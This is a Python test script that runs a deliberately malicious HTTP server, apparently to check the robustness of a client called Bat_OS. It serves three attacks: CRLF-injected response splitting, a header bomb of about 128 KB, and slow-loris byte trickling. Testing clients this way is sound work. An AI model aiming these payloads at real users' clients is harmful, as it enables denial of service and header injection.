#!/usr/bin/env python3
"""
fuzz_http.py — ATTACK-NET-042, 045, 046

Runs as a malicious HTTP server. Bat_OS must initiate the connection,
so point the browser at http://<host>:<port>/.

042: response splitting — Location header with CRLF injection.
045: header bomb — 128 KB of headers.
046: slow-loris — one byte every 4 seconds.

Usage: python3 fuzz_http.py <port> [--attack 046]
"""

import sys
import socket
import time


def handle_042(conn):
    # Inject CRLF inside a Location header
    body = b"go away"
    resp = (
        b"HTTP/1.1 302 Found\r\n"
        b"Location: http://example.com/\r\nX-Injected: evil\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"\r\n" + body
    )
    conn.sendall(resp)
    print("[ATTACK-NET-042] SENT response with CRLF-injected header")


def handle_045(conn):
    headers = [b"HTTP/1.1 200 OK"]
    for i in range(2000):
        headers.append(f"X-Filler-{i}: {'A' * 60}".encode())
    headers.append(b"Content-Length: 0")
    headers.append(b"")
    headers.append(b"")
    conn.sendall(b"\r\n".join(headers))
    print(f"[ATTACK-NET-045] SENT header bomb ({sum(len(h) for h in headers)} bytes of headers)")


def handle_046(conn):
    # Slow-loris: send one byte every 4 seconds
    conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 100\r\n\r\n")
    print("[ATTACK-NET-046] entering slow-loris mode (1 byte / 4s, forever)")
    try:
        for i in range(50):
            conn.sendall(b"X")
            time.sleep(4)
    except Exception:
        pass


def serve(port, attack):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", port))
    sock.listen(4)
    print(f"[*] Malicious HTTP server on :{port} (attack={attack})")

    while True:
        c, peer = sock.accept()
        print(f"[*] Connection from {peer}")
        # drain request
        try:
            c.settimeout(2)
            while b"\r\n\r\n" not in c.recv(4096):
                pass
        except Exception:
            pass
        c.settimeout(None)

        try:
            if attack == "042": handle_042(c)
            elif attack == "045": handle_045(c)
            elif attack == "046": handle_046(c)
            else: c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
        finally:
            c.close()


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    attack = "046"
    if "--attack" in sys.argv:
        attack = sys.argv[sys.argv.index("--attack") + 1]
    serve(port, attack)
